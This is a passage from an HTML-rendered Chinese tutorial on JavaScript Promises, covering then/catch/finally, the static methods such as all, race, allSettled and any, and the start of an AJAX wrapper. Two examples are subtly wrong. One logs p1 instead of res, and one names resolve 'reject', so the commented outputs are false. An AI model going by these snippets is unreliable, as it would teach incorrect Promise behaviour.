    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第三步：'</span>, num); <span class="hljs-comment">// 3（1秒后）</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'主动抛出错误'</span>); <span class="hljs-comment">// 抛出错误，触发后续catch</span>
  })
  .<span class="hljs-title function_">then</span>(
    <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'第四步：'</span>, num), <span class="hljs-comment">// 不会执行</span>
    <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'then捕获错误：'</span>, err.<span class="hljs-property">message</span>) <span class="hljs-comment">// 可捕获，但推荐用catch</span>
  );
</code></pre>
<h4 data-id="heading-17">2. catch(onRejected)：专门处理失败结果</h4>
<p><code>.catch()</code> 是 <code>.then(null, onRejected)</code> 的<strong>语法糖</strong>，专门用于捕获 Promise 链式调用中<strong>所有前置操作</strong>的错误（包括 <code>reject()</code> 触发的失败、回调函数中抛出的错误、同步代码错误），是 Promise 错误处理的<strong>推荐方式</strong>。</p>
<h5 data-id="heading-18">核心特性</h5>
<ol>
<li><strong>全局错误捕获</strong>：一个 <code>.catch()</code> 可捕获链式调用中<strong>所有前置</strong> <code>.then()</code> 的错误，无需在每个 <code>.then()</code> 中单独处理；</li>
<li><strong>链式调用</strong>：<code>.catch()</code> 执行后也会返回新的 Promise 实例，若在 <code>.catch()</code> 中返回普通值，可继续链式调用 <code>.then()</code>；</li>
<li><strong>错误兜底</strong>：若 Promise 链式调用中没有 <code>.catch()</code>，未捕获的错误会触发浏览器的 <code>unhandledrejection</code> 事件，导致控制台报错（生产环境需避免）；</li>
<li><strong>捕获范围</strong>：不仅捕获 Promise 自身的 <code>reject()</code>，还捕获所有回调函数中的<strong>同步错误</strong>和<strong>异步错误</strong>（如回调中调用未定义的变量）。</li>
</ol>
<h5 data-id="heading-19">基础使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'异步操作失败'</span>));
})
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'成功：'</span>, res)) <span class="hljs-comment">// 不会执行</span>
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'catch捕获错误：'</span>, err.<span class="hljs-property">message</span>)); <span class="hljs-comment">// 输出：异步操作失败</span>
</code></pre>
<h5 data-id="heading-20">全局错误捕获示例（链式核心）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 一个catch捕获所有前置错误</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
  <span class="hljs-title function_">resolve</span>(<span class="hljs-number">1</span>);
})
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num);
    a++; <span class="hljs-comment">// 引用未定义变量，同步错误</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num)) <span class="hljs-comment">// 不会执行</span>
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'catch捕获所有错误：'</span>, err.<span class="hljs-property">message</span>); <span class="hljs-comment">// 输出：a is not defined</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>; <span class="hljs-comment">// 返回普通值，继续链式调用</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'catch后继续执行：'</span>, num)); <span class="hljs-comment">// 输出：10</span>
</code></pre>
<h4 data-id="heading-21">3. finally(onFinally)：处理最终收尾操作</h4>
<p><code>.finally()</code> 是 ES2018 引入的方法，用于指定<strong>无论 Promise 状态是成功还是失败，都会执行的收尾操作</strong>，比如关闭加载弹窗、释放资源、取消定时器等。</p>
<h5 data-id="heading-22">核心特性</h5>
<ol>
<li><strong>无参数</strong>：<code>.finally()</code> 的回调函数<strong>不接收任何参数</strong>，因为它无需关心 Promise 的执行结果（成功/失败），仅做通用收尾；</li>
<li><strong>必然执行</strong>：无论 Promise 是 <code>fulfilled</code> 还是 <code>rejected</code>，也无论链式调用中是否有 <code>.catch()</code>，<code>.finally()</code> 都会执行；</li>
<li><strong>链式调用</strong>：<code>.finally()</code> 也会返回新的 Promise 实例，且会<strong>透传</strong>前置 Promise 的成功结果或失败原因（即不改变原有的结果）；</li>
<li><strong>无返回值影响</strong>：<code>.finally()</code> 的回调函数返回的值会被忽略，不会影响后续链式调用的参数。</li>
</ol>
<h5 data-id="heading-23">基础使用示例（最常用场景：关闭加载）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟接口请求</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">requestData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'显示加载弹窗'</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> isSuccess = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span>;
      <span class="hljs-keyword">if</span> (isSuccess) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'请求成功：获取到数据'</span>);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'请求失败：网络错误'</span>));
      }
    }, <span class="hljs-number">1000</span>);
  });
}

<span class="hljs-comment">// 执行请求，finally关闭加载</span>
<span class="hljs-title function_">requestData</span>()
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>))
  .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'关闭加载弹窗'</span>); <span class="hljs-comment">// 无论成功/失败，都会执行</span>
  });
</code></pre>
<h5 data-id="heading-24">透传结果示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// finally透传成功结果</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'成功数据'</span>))
  .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'执行finally'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">'finally的返回值'</span>; <span class="hljs-comment">// 会被忽略</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'最终结果：'</span>, res)); <span class="hljs-comment">// 输出：成功数据</span>

<span class="hljs-comment">// finally透传失败原因</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">reject</span>) =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'失败原因'</span>)))
  .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'执行finally'</span>))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'最终错误：'</span>, err.<span class="hljs-property">message</span>)); <span class="hljs-comment">// 输出：失败原因</span>
</code></pre>
<h3 data-id="heading-25">🚀 四、Promise 构造函数的静态方法</h3>
<p>Promise 构造函数本身提供了多个<strong>静态方法</strong>，用于快速创建 Promise 实例或批量管理多个 Promise 实例，是处理<strong>多异步操作流程控制</strong>的核心，日常开发中使用频率极高。</p>
<h4 data-id="heading-26">1. Promise.resolve(value)：快速创建成功的 Promise</h4>
<p>用于快速创建一个<strong>状态为 fulfilled</strong> 的 Promise 实例，等价于 <code>new Promise(resolve =&gt; resolve(value))</code>，适合将<strong>普通值、非 Promise 异步操作</strong>转为 Promise 格式，实现统一的异步接口。</p>
<h5 data-id="heading-27">核心特性</h5>
<ul>
<li>若参数 <code>value</code> 是<strong>普通值</strong>（基本类型、对象），新 Promise 直接以该值为成功结果；</li>
<li>若参数 <code>value</code> 是<strong>另一个 Promise 实例</strong>，则直接返回该实例（状态和结果均透传）；</li>
<li>若参数 <code>value</code> 是<strong>具有 then 方法的对象（thenable）</strong>，则会执行其 <code>then</code> 方法，根据 <code>then</code> 方法的执行结果确定新 Promise 的状态。</li>
</ul>
<h5 data-id="heading-28">使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 传入普通值</span>
<span class="hljs-keyword">const</span> p1 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">123</span>);
p1.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p1)); <span class="hljs-comment">// 123</span>

<span class="hljs-comment">// 2. 传入Promise实例</span>
<span class="hljs-keyword">const</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'原Promise'</span>));
<span class="hljs-keyword">const</span> p3 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(p2);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p2 === p3); <span class="hljs-comment">// true（直接返回原实例）</span>

<span class="hljs-comment">// 3. 传入thenable对象</span>
<span class="hljs-keyword">const</span> thenable = {
  <span class="hljs-title function_">then</span>(<span class="hljs-params">resolve</span>) {
    <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'thenable执行成功'</span>);
  }
};
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(thenable).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)); <span class="hljs-comment">// thenable执行成功</span>
</code></pre>
<h4 data-id="heading-29">2. Promise.reject(reason)：快速创建失败的 Promise</h4>
<p>用于快速创建一个<strong>状态为 rejected</strong> 的 Promise 实例，等价于 <code>new Promise((resolve, reject) =&gt; reject(reason))</code>，适合快速抛出异步错误。</p>
<h5 data-id="heading-30">核心特性</h5>
<ul>
<li>无论参数 <code>reason</code> 是什么类型（普通值、Promise 实例、thenable 对象），都会直接作为<strong>失败原因</strong>传递给 <code>.catch()</code>，<strong>不会透传</strong> Promise 实例的状态（与 <code>Promise.resolve</code> 不同）。</li>
</ul>
<h5 data-id="heading-31">使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 传入普通错误</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'简单错误'</span>).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)); <span class="hljs-comment">// 简单错误</span>

<span class="hljs-comment">// 2. 传入Error对象（推荐）</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'标准错误'</span>)).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>)); <span class="hljs-comment">// 标准错误</span>

<span class="hljs-comment">// 3. 传入Promise实例（不会透传，直接作为原因）</span>
<span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'成功的Promise'</span>);
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(p).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err === p)); <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-32">3. Promise.all(iterable)：所有异步操作都成功才成功</h4>
<p><strong>核心场景</strong>：处理<strong>并行的多个异步操作</strong>，且<strong>所有操作都必须成功</strong>，才返回所有结果；只要有一个操作失败，立即返回该失败原因（<strong>快速失败</strong>机制）。</p>
<h5 data-id="heading-33">核心特性</h5>
<ul>
<li>参数 <code>iterable</code>：可迭代对象（如数组），每个元素都是 Promise 实例；</li>
<li>成功结果：当<strong>所有</strong> Promise 都变为 <code>fulfilled</code>，新 Promise 以 <code>fulfilled</code> 状态返回<strong>结果数组</strong>，数组顺序与传入的 Promise 顺序一致（与执行完成顺序无关）；</li>
<li>失败机制：只要有<strong>一个</strong> Promise 变为 <code>rejected</code>，新 Promise 立即以 <code>rejected</code> 状态返回该失败原因，其余未完成的 Promise 仍会执行，但结果会被忽略；</li>
<li>空数组：若传入空数组，会<strong>立即成功</strong>，返回空数组。</li>
</ul>
<h5 data-id="heading-34">使用示例（并行请求多个接口）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟3个并行的接口请求</span>
<span class="hljs-keyword">const</span> request1 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'接口1数据'</span>);
<span class="hljs-keyword">const</span> request2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'接口2数据'</span>), <span class="hljs-number">1000</span>));
<span class="hljs-keyword">const</span> request3 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'接口3数据'</span>);

<span class="hljs-comment">// 所有请求都成功才返回结果</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([request1, request2, request3])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'所有请求成功：'</span>, res); <span class="hljs-comment">// 输出：['接口1数据', '接口2数据', '接口3数据']（1秒后）</span>
    <span class="hljs-keyword">const</span> [data1, data2, data3] = res; <span class="hljs-comment">// 按顺序解构</span>
  })
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'有请求失败：'</span>, err.<span class="hljs-property">message</span>));

<span class="hljs-comment">// 一个请求失败的情况</span>
<span class="hljs-keyword">const</span> request4 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'接口4请求失败'</span>));
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([request1, request4, request3])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)) <span class="hljs-comment">// 不会执行</span>
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>)); <span class="hljs-comment">// 立即输出：接口4请求失败</span>
</code></pre>
<h4 data-id="heading-35">4. Promise.race(iterable)：第一个完成的异步操作决定结果</h4>
<p><strong>核心场景</strong>：处理<strong>并行的多个异步操作</strong>，<strong>谁先完成（成功/失败），就取谁的结果</strong>，其余未完成的 Promise 仍会执行，但结果会被忽略（“赛跑”机制）。</p>
<h5 data-id="heading-36">核心特性</h5>
<ul>
<li>参数 <code>iterable</code>：可迭代对象，每个元素都是 Promise 实例；</li>
<li>结果由“第一个定型”的 Promise 决定：无论第一个完成的是 <code>fulfilled</code> 还是 <code>rejected</code>，新 Promise 都会继承其状态和结果；</li>
<li>空数组：若传入空数组，新 Promise 会一直处于 <code>pending</code> 状态，永不定型。</li>
</ul>
<h5 data-id="heading-37">经典使用示例：接口请求超时控制</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟接口请求</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">request</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'接口请求成功'</span>), <span class="hljs-number">2000</span>); <span class="hljs-comment">// 2秒后完成</span>
  });
}

<span class="hljs-comment">// 模拟超时器（1.5秒后失败）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">timeout</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'请求超时：1.5秒未响应'</span>)), <span class="hljs-number">1500</span>);
  });
}

<span class="hljs-comment">// 赛跑：请求和超时器，谁先完成取谁的结果</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([<span class="hljs-title function_">request</span>(), <span class="hljs-title function_">timeout</span>()])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)) <span class="hljs-comment">// 不会执行，因为超时器先完成</span>
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>)); <span class="hljs-comment">// 输出：请求超时：1.5秒未响应</span>
</code></pre>
<h4 data-id="heading-38">5. Promise.allSettled(iterable)：等待所有异步操作都完成</h4>
<p><strong>核心场景</strong>：处理<strong>并行的多个异步操作</strong>，<strong>无论成功还是失败，都会等待所有操作完成</strong>，并返回每个操作的详细结果（包含状态和值/原因），解决了 <code>Promise.all</code> 快速失败的问题（适合需要知道所有操作结果的场景，如批量上传）。</p>
<h5 data-id="heading-39">核心特性</h5>
<ul>
<li>ES2020 引入，现代浏览器均支持；</li>
<li>参数 <code>iterable</code>：可迭代对象，每个元素都是 Promise 实例；</li>
<li>成功结果：当<strong>所有</strong> Promise 都定型（settled），新 Promise 一定是 <code>fulfilled</code> 状态，返回<strong>结果数组</strong>，数组顺序与传入顺序一致；</li>
<li>每个结果对象包含两个属性：
<ul>
<li><code>status</code>：字符串，值为 <code>fulfilled</code> 或 <code>rejected</code>；</li>
<li><code>value</code>：仅 <code>status</code> 为 <code>fulfilled</code> 时存在，是成功结果；</li>
<li><code>reason</code>：仅 <code>status</code> 为 <code>rejected</code> 时存在，是失败原因。</li>
</ul>
</li>
</ul>
<h5 data-id="heading-40">使用示例（批量上传，需知道每个文件的上传结果）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟3个文件上传的异步操作（2成功1失败）</span>
<span class="hljs-keyword">const</span> upload1 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'文件1上传成功'</span>);
<span class="hljs-keyword">const</span> upload2 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'文件2上传失败：文件过大'</span>));
<span class="hljs-keyword">const</span> upload3 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'文件3上传成功'</span>);

<span class="hljs-comment">// 等待所有上传操作完成，获取每个操作的结果</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">allSettled</span>([upload1, upload2, upload3])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">results</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'所有上传结果：'</span>, results);
    <span class="hljs-comment">// 筛选成功/失败的结果</span>
    <span class="hljs-keyword">const</span> successList = results.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">status</span> === <span class="hljs-string">'fulfilled'</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">value</span>);
    <span class="hljs-keyword">const</span> failList = results.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">status</span> === <span class="hljs-string">'rejected'</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">reason</span>.<span class="hljs-property">message</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'成功的上传：'</span>, successList); <span class="hljs-comment">// ['文件1上传成功', '文件3上传成功']</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'失败的上传：'</span>, failList); <span class="hljs-comment">// ['文件2上传失败：文件过大']</span>
  });
</code></pre>
<h4 data-id="heading-41">6. Promise.any(iterable)：第一个成功的异步操作决定结果</h4>
<p><strong>核心场景</strong>：处理<strong>并行的多个异步操作</strong>，<strong>忽略失败的操作，等待第一个成功的操作</strong>返回结果；若所有操作都失败，才返回聚合错误（适合多节点请求，取最快成功的节点数据）。</p>
<h5 data-id="heading-42">核心特性</h5>
<ul>
<li>ES2021 引入，现代浏览器均支持；</li>
<li>参数 <code>iterable</code>：可迭代对象，每个元素都是 Promise 实例；</li>
<li>成功机制：只要有<strong>一个</strong> Promise 变为 <code>fulfilled</code>，新 Promise 立即继承其成功结果，其余未完成的 Promise 仍会执行，结果被忽略；</li>
<li>失败机制：若<strong>所有</strong> Promise 都变为 <code>rejected</code>，新 Promise 会变为 <code>rejected</code>，抛出 <code>AggregateError</code> 错误（包含所有失败原因）。</li>
</ul>
<h5 data-id="heading-43">使用示例（多节点请求，取最快成功的结果）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟3个节点的接口请求（2失败1成功，成功的节点最慢）</span>
<span class="hljs-keyword">const</span> requestNode1 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'节点1请求失败'</span>));
<span class="hljs-keyword">const</span> requestNode2 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'节点2请求失败'</span>));
<span class="hljs-keyword">const</span> requestNode3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'节点3请求成功，获取数据'</span>), <span class="hljs-number">1000</span>));

<span class="hljs-comment">// 取第一个成功的请求结果</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">any</span>([requestNode1, requestNode2, requestNode3])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'最快成功的节点：'</span>, res)) <span class="hljs-comment">// 输出：节点3请求成功，获取数据</span>
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'所有节点都失败：'</span>, err);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'所有失败原因：'</span>, err.<span class="hljs-property">errors</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-property">message</span>));
  });

<span class="hljs-comment">// 所有操作都失败的情况</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">any</span>([<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'失败1'</span>), <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'失败2'</span>)])
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">AggregateError</span>); <span class="hljs-comment">// true</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">errors</span>); <span class="hljs-comment">// ['失败1', '失败2']</span>
  });
</code></pre>
<h3 data-id="heading-44">⌛ 五、Promise 经典实战场景</h3>
<h4 data-id="heading-45">1. 封装 AJAX 请求（Promise 版）</h4>
<p>传统 AJAX 基于回调，封装为 Promise 后支持链式调用和统一错误处理，是前端最基础的实战场景：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * Promise 版 AJAX 封装
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">url</span> - 请求地址
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">method</span> - 请求方法：GET/POST
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} <span class="hljs-variable">data</span> - 请求参数
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise</span>}
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ajax</span>(<span class="hljs-params">{ url, method = <span class="hljs-string">'GET'</span>, data = {} }</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();
    <span class="hljs-comment">// 处理GET参数</span>
    <span class="hljs-keyword">if</span> (method.<span class="hljs-title function_">toUpperCase</span>() === <span class="hljs-string">'GET'</span> &amp;&amp; <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(data).<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(data).<span class="hljs-title function_">toString</span>();
      url += <span class="hljs-string">'?'</span> + params;
    }
    xhr.<span class="hljs-title function_">open</span>(method, url, <span class="hljs-literal">true</span>);
    <span class="hljs-comment">// 设置POST请求头</span>
    <span class="hljs-keyword">if</span> (method.<span class="hljs-title function_">toUpperCase</span>() === <span class="hljs-string">'POST'</span>) {
